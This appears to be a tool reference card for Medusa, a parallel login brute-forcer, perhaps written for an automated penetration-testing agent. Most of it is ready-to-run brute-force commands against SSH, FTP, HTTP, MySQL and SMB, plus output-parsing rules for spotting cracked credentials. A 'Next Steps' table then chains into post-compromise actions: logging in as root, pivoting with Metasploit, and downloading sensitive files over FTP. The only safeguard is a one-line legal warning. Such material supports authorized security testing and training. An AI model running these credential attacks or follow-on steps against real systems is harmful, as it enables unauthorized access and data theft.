# Medusa - Parallel Password Cracker

## Overview
| Attribute | Value |
|-----------|-------|
| Binary | `medusa` |
| Category | Credential Brute-forcing |
| Risk Level | High |

## Description
Medusa is a speedy, parallel, modular login brute-forcer supporting numerous protocols. It's designed for high-speed parallel testing.

---

## Supported Protocols
`ssh`, `ftp`, `http`, `mssql`, `mysql`, `postgres`, `rdp`, `smb`, `smtp`, `telnet`, `vnc`, `pop3`, `imap`, `svn`, `cvs`, `nntp`, `pcanywhere`, `rexec`, `rlogin`, `rsh`, `smbnt`, `snmp`, `wrapper`, `web-form`

---

## Usage Patterns

### 1. Single Host SSH Attack
**Goal:** Brute-force SSH login.
```bash
medusa -h <host> -u <user> -P <password_list> -M ssh
```
**Example:**
```bash
medusa -h 192.168.1.10 -u root -P /usr/share/wordlists/rockyou.txt -M ssh
```

### 2. Multiple Hosts
**Goal:** Attack multiple targets.
```bash
medusa -H hosts.txt -u admin -P passwords.txt -M ssh
```

### 3. Multiple Users
**Goal:** Try multiple usernames.
```bash
medusa -h <host> -U users.txt -P passwords.txt -M ssh
```

### 4. FTP Attack
```bash
medusa -h <host> -u anonymous -P passwords.txt -M ftp
```

### 5. HTTP Basic Auth
```bash
medusa -h <host> -u admin -P passwords.txt -M http -m DIR:/admin
```

### 6. MySQL Attack
```bash
medusa -h <host> -u root -P passwords.txt -M mysql
```

### 7. SMB Attack
```bash
medusa -h <host> -u administrator -P passwords.txt -M smbnt
```

### 8. Custom Port
```bash
medusa -h <host> -n 2222 -u root -P passwords.txt -M ssh
```

---

## Important Options
| Flag | Description |
|------|-------------|
| `-h` | Target host |
| `-H` | File with target hosts |
| `-u` | Single username |
| `-U` | Username file |
| `-p` | Single password |
| `-P` | Password file |
| `-M` | Module (protocol) name |
| `-m` | Module-specific parameters |
| `-n` | Custom port |
| `-t` | Total parallel logins (default: 1) |
| `-T` | Parallel hosts (default: 1) |
| `-f` | Stop on first valid password |
| `-F` | Stop on first valid per host |
| `-e ns` | Try null/same passwords |
| `-O` | Output file |
| `-v` | Verbose level (0-6) |

---

## Module Parameters (-m)
Each module supports specific parameters:

**HTTP:**
- `DIR:/path` - Target path
- `AUTH:basic` - Auth type

**Example:**
```bash
medusa -h target.com -u admin -P pass.txt -M http -m DIR:/admin -m AUTH:basic
```

---

## Output Parsing

### Sample Output
```
Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks

ACCOUNT CHECK: [ssh] Host: 192.168.1.10 (1 of 1, 0 complete) User: root (1 of 1, 0 complete) Password: admin (1 of 100, 0 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.1.10 (1 of 1, 0 complete) User: root (1 of 1, 0 complete) Password: password (2 of 100, 0 complete)
ACCOUNT FOUND: [ssh] Host: 192.168.1.10 User: root Password: toor [SUCCESS]
```

### Parsing Rules
- `ACCOUNT CHECK:` = attempt in progress (verbose mode)
- `ACCOUNT FOUND: ... [SUCCESS]` = **valid credentials discovered**
- `[SUCCESS]` suffix confirms authentication was successful
- `-O` flag writes successful results to output file

---

## Next Steps

| Finding | Recommended Next Tool | Example |
|---------|----------------------|---------|
| SSH credentials found | Direct SSH access | `ssh root@192.168.1.10` |
| Multiple hosts compromised | Pivot with `msfconsole` | `use post/multi/manage/autoroute` |
| FTP access gained | Download sensitive files | `curl ftp://target -u user:pass -O` |
| No valid passwords | Try `cewl` for custom wordlist | `cewl -d 3 http://target -w custom.txt` |

---

## Safety Warnings
| Risk | Description |
|------|-------------|
| **Account Lockout** | May trigger lockout policies |
| **Detection** | High connection rate detected |
| **Legal** | Unauthorized access is illegal |

---

## Comparison with Hydra
| Aspect | Medusa | Hydra |
|--------|--------|-------|
| Speed | Fast | Fast |
| Modularity | Module-based | Built-in protocols |
| HTTP Forms | Limited | Excellent |
| Stability | Very stable | Good |
| Output | Simple | Detailed |

> **Recommendation:** Use Hydra for HTTP forms, Medusa for other protocols.
